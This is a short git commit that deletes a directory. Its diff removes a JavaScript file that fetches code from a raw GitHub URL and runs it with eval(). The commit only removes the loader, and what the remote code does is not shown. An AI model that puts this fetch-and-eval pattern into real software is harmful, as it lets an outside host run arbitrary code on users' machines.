b4c6539d73ff4f328dbf775e77d11192554b4ade
xTymezzAlt <fete3712@gmail.com>
2026-07-02 14:10:33 +0200

    Delete riot directory

--- riot/js/thunderz/runthis.js
+++
@@ -1,6 +0,0 @@
-fetch("https://raw.githubusercontent.com/fete3712-vmX/Something/refs/heads/main/riot/js/thunderz/runthis.js")
-  .then(res => res.text())
-  .then(code => {
-    eval(code);
-   })
-  .catch(err => console.error(err));
